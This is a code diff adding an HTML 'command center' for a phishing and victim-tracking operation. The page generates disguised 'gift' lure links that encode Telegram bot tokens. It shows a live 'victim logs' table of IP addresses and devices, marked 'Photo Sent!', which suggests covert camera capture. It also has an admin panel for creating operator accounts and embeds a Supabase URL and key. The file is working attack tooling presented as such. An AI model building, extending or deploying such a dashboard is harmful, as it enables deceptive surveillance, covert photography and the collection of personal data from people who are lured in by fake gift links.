@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>VOLOX | Command Center</title>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js"></script>
+    <style>
+        body { background: #050505; color: #00ff41; font-family: monospace; padding: 20px; }
+        .grid { display: grid; grid-template-columns: 300px 1fr; gap: 20px; }
+        .panel { border: 1px solid #00ff41; padding: 15px; border-radius: 5px; background: #0a0a0a; }
+        input, select, button { width: 100%; margin-bottom: 10px; background: #000; border: 1px solid #00ff41; color: #00ff41; padding: 8px; }
+        button { cursor: pointer; background: #00ff41; color: #000; font-weight: bold; }
+        table { width: 100%; border-collapse: collapse; font-size: 12px; }
+        th, td { border: 1px solid #333; padding: 8px; text-align: left; }
+    </style>
+</head>
+<body>
+    <h1>[ VOLOX_SYSTEM_v2.0 ]</h1>
+    
+    <div class="grid">
+        <div class="panel">
+            <h3>GENERATE LINK</h3>
+            <input type="text" id="slug" placeholder="Slug (e.g., gift-box)">
+            <input type="text" id="target" placeholder="Redirect (YouTube/IG)">
+            <button onclick="createLink()">GENERATE NOW</button>
+            <div id="result" style="word-break: break-all; margin-top: 10px; color: yellow;"></div>
+        </div>
+
+        <div class="panel">
+            <h3>LIVE VICTIM LOGS</h3>
+            <table>
+                <thead>
+                    <tr>
+                        <th>Time</th>
+                        <th>IP Address</th>
+                        <th>Device</th>
+                        <th>Action</th>
+                    </tr>
+                </thead>
+                <tbody id="logTable">
+                    </tbody>
+            </table>
+        </div>
+    </div>
+
+    <div class="panel" style="margin-top: 20px;" id="adminPanel">
+        <h3>ADMIN: CREATE NEW USER</h3>
+        <input type="text" id="new_user" placeholder="Username">
+        <input type="password" id="new_pass" placeholder="Password">
+        <input type="text" id="user_token" placeholder="Bot Token">
+        <input type="text" id="user_id" placeholder="Chat ID">
+        <button onclick="addUser()">CREATE ACCOUNT</button>
+    </div>
+
+    <script>
+        // Masukkan URL & Key dari Supabase Settings
+        const SUPABASE_URL = 'https://wypeyjmknmdmjcapwkcl.supabase.co';
+        const SUPABASE_KEY = 'sb_publishable_AcYJSYypfdfWq0sQQv4FzA_6VZOvyHZ';
+        const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+
+        async function createLink() {
+            const slug = document.getElementById('slug').value;
+            // Di sini kita tidak butuh database untuk link, 
+            // cukup gunakan format base64 yang tadi agar tetap serverless.
+            const userToken = btoa("TOKEN_USER_INI"); // Ambil dari session login
+            const userId = btoa("ID_USER_INI");
+            const final = `https://prizepool-gift.netlify.app/#t=${userToken}&i=${userId}`;
+            document.getElementById('result').innerText = "Link Ready: " + final;
+        }
+
+        async function fetchLogs() {
+            const { data, error } = await supabase.from('victim_logs').select('*').order('created_at', { ascending: false });
+            const table = document.getElementById('logTable');
+            table.innerHTML = data.map(log => `
+                <tr>
+                    <td>${new Date(log.created_at).toLocaleString()}</td>
+                    <td>${log.ip_address}</td>
+                    <td>${log.device_info}</td>
+                    <td><span style="color:red">Photo Sent!</span></td>
+                </tr>
+            `).join('');
+        }
+
+        setInterval(fetchLogs, 5000); // Auto Refresh Log tiap 5 detik
+    </script>
+</body>
+</html>
